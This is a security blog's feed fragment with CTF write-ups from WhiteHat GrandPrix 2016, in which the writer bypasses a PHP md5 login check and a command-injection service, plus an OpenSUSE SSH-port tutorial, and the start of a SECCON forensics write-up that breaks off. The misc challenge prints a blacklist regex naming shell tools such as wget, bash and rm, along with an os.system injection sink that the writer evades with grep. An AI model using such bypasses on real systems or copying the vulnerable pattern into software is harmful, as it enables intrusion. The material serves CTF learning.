<li>Format the flag: <code>WhiteHat{31bd8aa56447ea1c703d0943e175a06a5c4ee614}</code>.</li>
<li>This time this is the good one.</li>
</ul>
<p>Here was my ruby script:</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/ruby</span></div><div class="line"></div><div class="line">(<span class="number">1</span>..<span class="number">30</span>).each <span class="keyword">do</span> <span class="params">|num|</span></div><div class="line">	raw_flag = File.read(<span class="string">'flag'</span>+num.to_s+<span class="string">'.txt'</span>)</div><div class="line">	<span class="comment"># Not sanitized flags</span></div><div class="line">	puts <span class="string">'raw: '</span>.concat(raw_flag)</div><div class="line">	only_flag = raw_flag.match(<span class="regexp">/\&#123;([a-z0-9]&#123;33&#125;)\&#125;/</span>).captures[<span class="number">0</span>]</div><div class="line">	<span class="comment"># Sanitized flags</span></div><div class="line">	puts only_flag.gsub(<span class="regexp">/[^0-9a-fA-F]/</span>, <span class="string">''</span>)</div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure>
<p><strong>Note</strong>: CTF orga team should test challenges and remove the crappy ones before let teams have pain with them.</p>
<h2 id="Submit"><a href="#Submit" class="headerlink" title="Submit"></a>Submit</h2><p><img src="http://i.imgur.com/qdWgxcB.jpg" alt=""></p>
<p>And we also get one of the 23 parts of the puzzle:</p>
<p><img src="http://i.imgur.com/N6ZHerV.png" alt=""></p>
<p>This is for the <em>Discovering Vietnam</em> bonus challenge. It is a puzzle of 23 parts, you need them to get a QR-code that give a flag. Flag will give 10% bonus points of the current score.</p>
<p>I think we need to do almost all challenges to get all the pieces.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
      <category term="forensics" scheme="http://rawsec.ml/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>WhiteHat GrandPrix - 100 - Banh bot loc - Web</title>
    <link href="http://rawsec.ml/en/WhiteHat-GrandPrix-2016-web-100-banh-bot-loc/"/>
    <id>http://rawsec.ml/en/WhiteHat-GrandPrix-2016-web-100-banh-bot-loc/</id>
    <published>2016-12-16T23:00:00.000Z</published>
    <updated>2016-12-18T15:46:13.783Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : WhiteHat GrandPrix 2016</li>
<li><strong>Website</strong> : <a href="https://grandprix.whitehatvn.com/Contests/ChallengesContest/32" target="_blank" rel="external">grandprix.whitehatvn.com</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/398" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote>
<p><a href="http://web05.grandprix.whitehatvn.com" target="_blank" rel="external">http://web05.grandprix.whitehatvn.com</a></p>
<p><a href="http://bakweb05.grandprix.whitehatvn.com:8125" target="_blank" rel="external">http://bakweb05.grandprix.whitehatvn.com:8125</a></p>
</blockquote>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Here is the home page:</p>
<p><img src="http://i.imgur.com/r2BGme3.png" alt=""></p>
<p>The login link go to <code>http://web05.grandprix.whitehatvn.com/index.php?username=guest&amp;password=guest</code> and says <code>noob</code>.</p>
<p><img src="http://i.imgur.com/w7FZJ9a.png" alt=""></p>
<p>Let’s see source code of teh web page:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'index.php?username=guest&amp;password=guest'</span>&gt;</span>login<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span>Login to get our secret<span class="tag">&lt;/<span class="name">html</span>&gt;</span></div><div class="line"><span class="comment">&lt;!-- index.php.bak --&gt;</span></div></pre></td></tr></table></figure>
<p>Ok, let’s see <code>index.php.bak</code>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checklogin</span><span class="params">($username, $password, $key, $secret)</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span>($username.$key == md5($password))</div><div class="line">		<span class="keyword">echo</span> $secret;</div><div class="line">	<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">"noob"</span>;</div><div class="line">    &#125;</div><div class="line">$key = <span class="string">"1337"</span>;</div><div class="line">$secret = <span class="string">"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;html&gt;</span></div><div class="line">    &lt;title&gt;hello&lt;/title&gt;</div><div class="line">    &lt;body&gt;</div><div class="line">    &lt;a href='index.php?username=guest&amp;password=guest'&gt;login&lt;/a&gt;&lt;br&gt;</div><div class="line">    &lt;/body&gt;";</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]))</div><div class="line">    &#123;</div><div class="line">        checklogin($_GET[<span class="string">'username'</span>],$_GET[<span class="string">'password'</span>],$key,$secret);</div><div class="line">        <span class="keyword">die</span>(<span class="number">0</span>);</div><div class="line">    &#125;</div><div class="line"><span class="keyword">echo</span> <span class="string">"Login to get our secret"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;/html&gt;"</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>Ok so the login checks that the concatenation of the username and the key is equal to the md5 hash of the password.</p>
<p>So we need to find a hash like <code>????????????????????????????1337</code> (28 random hex chars and 1337).</p>
<p>I first thought to download a md5 hash dictionary but I didn’t wanted to wait during teh download.</p>
<p>So I went to <a href="https://md5db.net/explore/0000" target="_blank" rel="external">md5db.net</a> and looked for a hash beginning with <code>0000</code>, did a <code>CTRL + F</code> to find <code>1337</code> and finaly found <a href="https://md5db.net/view/0000dd456d15560290351cb4e6311337" target="_blank" rel="external">one</a>: <strong>#</strong> <em>13381</em> <strong>Hash</strong> <em>0000dd456d15560290351cb4e6311337</em> <strong>Word</strong> <em>hdtfz</em>.</p>
<p>So we get:</p>
<ul>
<li>username: <code>0000dd456d15560290351cb4e631</code></li>
<li>key: <code>1337</code></li>
<li>password: <code>hdtfz</code></li>
</ul>
<p>I submited the url: <a href="http://web05.grandprix.whitehatvn.com/index.php?username=0000dd456d15560290351cb4e631&amp;password=hdtfz" target="_blank" rel="external">http://web05.grandprix.whitehatvn.com/index.php?username=0000dd456d15560290351cb4e631&amp;password=hdtfz</a> and got the flag <code>WhiteHat{92ab818618fee438a1ea3944b5940237975f2b1d}</code>.</p>
<p><img src="http://i.imgur.com/YxrFXdq.png" alt=""></p>
<h2 id="Submit"><a href="#Submit" class="headerlink" title="Submit"></a>Submit</h2><p><img src="http://i.imgur.com/aFTxLvH.jpg" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="web" scheme="http://rawsec.ml/tags/web/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>WhiteHat GrandPrix - 100 - Banh da Ke - Misc</title>
    <link href="http://rawsec.ml/en/WhiteHat-GrandPrix-2016-misc-100-Banh-da-Ke/"/>
    <id>http://rawsec.ml/en/WhiteHat-GrandPrix-2016-misc-100-Banh-da-Ke/</id>
    <published>2016-12-16T23:00:00.000Z</published>
    <updated>2016-12-18T15:46:13.780Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : WhiteHat GrandPrix 2016</li>
<li><strong>Website</strong> : <a href="https://grandprix.whitehatvn.com/Contests/ChallengesContest/32" target="_blank" rel="external">grandprix.whitehatvn.com</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/398" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote>
<p>When you gather all part of flag. Let’s submit: WhiteHat{SHA1(flag)}</p>
<p>nc misc04.grandprix.whitehatvn.com 23403</p>
<p>nc bakmisc04.grandprix.whitehatvn.com 23403</p>
<p><a href="http://material.grandprix.whitehatvn.com/gp2016/Misc04_be5358f2cb135ae9a38665a0d5ff199fc4fabb47.zip" target="_blank" rel="external">http://material.grandprix.whitehatvn.com/gp2016/Misc04_be5358f2cb135ae9a38665a0d5ff199fc4fabb47.zip</a></p>
<p><a href="http://bakmaterial.grandprix.whitehatvn.com/gp2016/Misc04_be5358f2cb135ae9a38665a0d5ff199fc4fabb47.zip" target="_blank" rel="external">http://bakmaterial.grandprix.whitehatvn.com/gp2016/Misc04_be5358f2cb135ae9a38665a0d5ff199fc4fabb47.zip</a></p>
<p>Alternative server on amazon in case of low traffic:</p>
<p><a href="http://54.183.97.137/gp2016/Misc04_be5358f2cb135ae9a38665a0d5ff199fc4fabb47.zip" target="_blank" rel="external">http://54.183.97.137/gp2016/Misc04_be5358f2cb135ae9a38665a0d5ff199fc4fabb47.zip</a></p>
</blockquote>
<p>create_folder_player.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> random</div><div class="line"></div><div class="line">flag = <span class="string">"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"</span></div><div class="line">count = <span class="number">0</span></div><div class="line">length = len(flag)</div><div class="line"><span class="keyword">print</span> length</div><div class="line"></div><div class="line">arr = random.sample(range(<span class="number">0</span>,<span class="number">10000</span>),length)</div><div class="line">arr = sorted(arr)</div><div class="line"></div><div class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10000</span>):</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        os.mkdir(str(k))</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">pass</span></div><div class="line">    <span class="keyword">if</span> k <span class="keyword">in</span> arr:</div><div class="line">        f=open(<span class="string">"./"</span>+str(k)+<span class="string">"/"</span>+os.urandom(<span class="number">8</span>).encode(<span class="string">"hex"</span>)+<span class="string">"."</span>+os.urandom(<span class="number">8</span>).encode(<span class="string">"hex"</span>),<span class="string">"w"</span>).write(str(flag[count]))</div><div class="line">        count +=<span class="number">1</span></div></pre></td></tr></table></figure>
<p>mics.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">import</span> sys</div><div class="line">blaclist = <span class="string">"cat|nano|less|tail|vim|head|apt|install|wget|more|emacs|vi|subl|pico|bash|sh|rm|sed|nl|flag.hihi|`|%|\$|chmod|python"</span></div><div class="line"></div><div class="line">myregrex = <span class="string">"\W*(?i)("</span>+blaclist+<span class="string">")\W*"</span></div><div class="line">cmd = <span class="string">""</span></div><div class="line"><span class="keyword">while</span>(cmd != <span class="string">"exit"</span>):</div><div class="line">    sys.stdout.write(<span class="string">"Input your command: \n"</span>)</div><div class="line">    sys.stdout.flush()</div><div class="line">    cmd = raw_input()</div><div class="line">    check = re.findall(myregrex,cmd)</div><div class="line">    <span class="keyword">if</span> check!=[]:</div><div class="line">        sys.stdout.write(<span class="string">"rejected\n"</span>)</div><div class="line">        sys.stdout.flush()</div><div class="line">        <span class="keyword">continue</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="comment">#call()</span></div><div class="line">        a =<span class="string">"XXXXXXXXXXXXX"</span></div><div class="line">        a+=cmd</div><div class="line">        os.system(a)</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        sys.stdout.write(<span class="string">"bad command\n"</span>)</div><div class="line">        sys.stdout.flush()</div></pre></td></tr></table></figure>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ul>
<li><code>create_folder_player.py</code>: there will be 10000 folders with one part of the flag in several of them choosen randomly.</li>
<li><code>misc.py</code>: lol, the spell. <code>blaclist</code> vs <code>blacklist</code>.</li>
<li><code>misc.py</code>: ok seriously, blacklist usage sucks so I wont do a script to send a <code>ls</code> for the all 10000 folders. I will simply find a command not blacklisted: <code>grep</code>.</li>
<li><code>grep</code> is magic, you can use all kind of regex and use it recursively:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">Input your command:</div><div class="line">grep -r -E &apos;*.*&apos; .</div><div class="line">./5256/7e8e1adc2c27d5ae.b20d7fe2eeee83a6:e</div><div class="line">./5363/049185c04d8d4a6a.14b749db725281b6:p</div><div class="line">./9149/e60247d6e9b86d66.538088287218f418:h</div><div class="line">./6625/99c4b89e33717d68.4e7cfddc3ab792ab:m</div><div class="line">./2961/af1fa87c94746adc.4ceba2ad4425295a:H</div><div class="line">./5360/3b1d1d39b7cdfc5e.b3d700c19f7da568:3</div><div class="line">./7520/be92bc1c03188333.8a0acf56d05e21f2:D</div><div class="line">./9460/0990eb1ff5a0f0f4.2b8448627eda707d:4</div><div class="line">./7261/85c5e9b11412182b.c8aa64a3e89d6116:4</div><div class="line">./4464/bfb49af4d0d18330.0e0a92989ea0cd16:&#123;</div><div class="line">./8447/1383404de7cf99d1.801ee7e580554bf7:r</div><div class="line">./9817/abb9dad1b91251c0.8aca51ae85b0a5a3:&#125;</div><div class="line">./2464/91001f84e6b7043c.362d39207f7113d5:e</div><div class="line">./6089/0da7f2cf81b578bc.64aceb97e90d59b8:4</div><div class="line">./7265/0d1d93183a71652c.f62fd332e6a893c7:n</div><div class="line">./8042/45b7f42e37a7036d.4649801c191cd850:t</div><div class="line">./8566/eb0eac89c6af6941.a01ee5abd0018d64:y</div><div class="line">./1490/ce66a0652ef071e2.8e59cb623f5044db:i</div><div class="line">./3391/d5bb02174118cd0a.8452e896dc972780:a</div><div class="line">./9729/ff958bf095684403.ba220df0c0a00cbc:d</div><div class="line">./5627/39835fcae4e0fb1e.d63a2b4f7cd6cc4d:_</div><div class="line">./5754/01b98e405d1a6f5e.dfea13f68bf1d28c:c</div><div class="line">./2124/0388bdb00dff778b.cf361e5e8cba7330:t</div><div class="line">./8919/8b998e1b2d84792e.05c56576bc8a640c:_</div><div class="line">./251/01fbe27318a591b2.32905c5f1c5d5be2:W</div><div class="line">./6805/421c3e7b161f09e6.cb2d792b88d852d3:_</div><div class="line">./7615/40672c2915963dc7.23d290b7ab5a23fe:_</div><div class="line">./4983/29a3e67904c136c1.82698942425d3172:k</div><div class="line">./4091/5d4d11679777c463.54a739cf22f2147f:t</div><div class="line">./1477/76ed9a66da76f47c.fffc5ebba341f304:h</div><div class="line">./6428/4ab16af8f7bea2ca.f326ac02efddd099:l</div><div class="line">./9664/3a309f1c601603e8.949523481193df68:r</div></pre></td></tr></table></figure>
<ul>
<li>Save the output in a text file.</li>
<li>Let’s order that with a ruby script:</li>
</ul>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/ruby</span></div><div class="line"></div><div class="line">arr = []</div><div class="line"></div><div class="line">File.open(<span class="string">'misc04.txt'</span>).each <span class="keyword">do</span> <span class="params">|line|</span></div><div class="line">    <span class="comment"># math the folderName, fileName and content of each file (one char)</span></div><div class="line">    regex = line.match(<span class="regexp">/\/([0-9]&#123;1,4&#125;)\/([a-f0-9]&#123;16&#125;\.[a-f0-9]&#123;16&#125;):(.)/</span>)</div><div class="line">    folderName = regex.captures[<span class="number">0</span>]</div><div class="line">    fileName = regex.captures[<span class="number">1</span>]</div><div class="line">    char = regex.captures[<span class="number">2</span>]</div><div class="line">    <span class="comment"># convert folderName to int in order to be able to sort it the right way. Sort as int (2464 &gt; 251), sort a string (2464 &lt; 251).</span></div><div class="line">    arr.push([folderName.to_i,fileName,char])</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment"># sort by first col, so sort by fileName</span></div><div class="line">arr.sort!</div><div class="line"><span class="comment"># display only chars (third column of each row)</span></div><div class="line">arr.each&#123;<span class="params">|r|</span> print r[<span class="number">2</span>]&#125;</div></pre></td></tr></table></figure>
<ul>
<li>Execute it:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]–––––––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016]</div><div class="line">$ ruby sorted.rb</div><div class="line">WhiteHat&#123;ke3p_c4lm_4nD_try_h4rd&#125;</div></pre></td></tr></table></figure>
<ul>
<li>Format the flag (WhiteHat{SHA1(flag)}):</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]–––––––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016]</div><div class="line">$ printf %s &apos;WhiteHat&#123;ke3p_c4lm_4nD_try_h4rd&#125;&apos; | sha1sum</div><div class="line">1a05093adb0795d8e2f5b89985c43b85bcb11d19  -</div></pre></td></tr></table></figure>
<ul>
<li>Submt the flag <code>WhiteHat{1a05093adb0795d8e2f5b89985c43b85bcb11d19}</code>.</li>
</ul>
<h2 id="Submit"><a href="#Submit" class="headerlink" title="Submit"></a>Submit</h2><p><img src="http://i.imgur.com/9wgmKeY.jpg" alt=""></p>
<p>Another piece of the puzzle:</p>
<p><img src="http://i.imgur.com/wfuiArQ.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
      <category term="misc" scheme="http://rawsec.ml/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>OpenSUSE : change ssh port / use a cutom ssh port</title>
    <link href="http://rawsec.ml/en/opensuse-change-ssh-port/"/>
    <id>http://rawsec.ml/en/opensuse-change-ssh-port/</id>
    <published>2016-12-13T23:00:00.000Z</published>
    <updated>2016-12-14T23:48:31.987Z</updated>
    
    <content type="html"><![CDATA[<p>For this exemple, our custom ssh port will be <strong>52222</strong>.</p>
<p>Edit <code>/etc/ssh/sshd_config</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># vim /etc/ssh/sshd_config</div></pre></td></tr></table></figure>
<p>Uncomment <code>Port 22</code> and change it to <code>Port 52222</code>.</p>
<p><strong>Note</strong>: You can add several times the <em>Port</em> directive to allow several ports. This can be usefull first to not be locked out of teh server. For example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Port 22</div><div class="line">Port 52222</div></pre></td></tr></table></figure>
<p>Restart the ssh deamon:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># systemctl restart sshd.service</div></pre></td></tr></table></figure>
<p>Do not close your current ssh session and test if you can localy connect via ssh with the new port:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ssh user@localhost -p 52222</div></pre></td></tr></table></figure>
<p>If it works you can <code>exit</code> the test ssh connection.</p>
<p>Now we will need to allow this new port in the firewall.</p>
<p>To do so, edit <code>/etc/sysconfig/SuSEfirewall2.d/services/sshd</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># vim /etc/sysconfig/SuSEfirewall2.d/services/sshd</div></pre></td></tr></table></figure>
<p>Change <code>TCP=&quot;ssh&quot;</code> to <code>TCP=&quot;52222&quot;</code> (this will only allow port 52222 for ssh) or to <code>TCP=&quot;ssh 52222&quot;</code> if you want both ports.</p>
<p><strong>Note</strong>: this is possible because there is <code>FW_CONFIGURATIONS_EXT=&quot;sshd&quot;</code> in your <code>/etc/sysconfig/SuSEfirewall2</code> config file. Known terms (mapping between well known ports and services, ex: ssh=22) are in <code>/etc/services</code>, it’s not advised to modify this file.</p>
<p>Now restart the firewall:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># systemctl restart SuSEfirewall2.service</div><div class="line">or</div><div class="line"># rcSuSEfirewall2 restart</div></pre></td></tr></table></figure>
<p><strong>Question</strong>: Why did we tested local ssh connection before modifying the firewall rules? Because the change we made only affects external connections (i.e. from the internet) so local connection are not restricted by firewall port filtering.</p>
<p>Now we can safely exit the remote ssh connection.</p>
<p>Now to connect to the server we have to specify the ssh port:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ssh user@example.org -p 52222</div></pre></td></tr></table></figure>
<p>or add a custom entry in <code>.ssh/config</code> (single user) or <code>/etc/ssh_config</code> (all users):</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Host host_alias</div><div class="line">    Hostname example.org</div><div class="line">    Port 52222</div><div class="line">    User user</div></pre></td></tr></table></figure>
<p>and simply connect with:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ssh host_alias</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;For this exemple, our custom ssh port will be &lt;strong&gt;52222&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Edit &lt;code&gt;/etc/ssh/sshd_config&lt;/code&gt;:&lt;/p&gt;
&lt;figure class=&quot;h
    
    </summary>
    
      <category term="linux" scheme="http://rawsec.ml/categories/linux/"/>
    
      <category term="opensuse" scheme="http://rawsec.ml/categories/linux/opensuse/"/>
    
    
      <category term="linux" scheme="http://rawsec.ml/tags/linux/"/>
    
      <category term="system" scheme="http://rawsec.ml/tags/system/"/>
    
      <category term="opensuse" scheme="http://rawsec.ml/tags/opensuse/"/>
    
  </entry>
  
  <entry>
    <title>SECCON - 100 - Memory Analysis - Forensics</title>
    <link href="http://rawsec.ml/en/SECCON-2016-100-forensics-memory-analysis/"/>
    <id>http://rawsec.ml/en/SECCON-2016-100-forensics-memory-analysis/</id>
    <published>2016-12-09T23:00:00.000Z</published>
    <updated>2016-12-10T17:05:35.827Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>Chill3d</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : SECCON 2016 Online CTF</li>
<li><strong>Website</strong> : <a href="http://2016.seccon.jp/news/#124" target="_blank" rel="external">seccon.jp</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/354/" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote>
<p>Find the website that the fake svchost is accessing.</p>
<p>You can get the flag if you access the website!!</p>
<p>The challenge files are huge, please download it first.</p>
<p>Hint1: <a href="http://www.volatilityfoundation.org/" target="_blank" rel="external">http://www.volatilityfoundation.org/</a></p>
<p>Hint2: Check the hosts file</p>
<p>password: fjliejflsjiejlsiejee33cnc</p>
</blockquote>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>For this challenge, we get a zip file wih a raw memory dump inside named <em>forensic_100.raw</em>.</p>
<p>First, let’s determine which OS is this dump come from :</p>
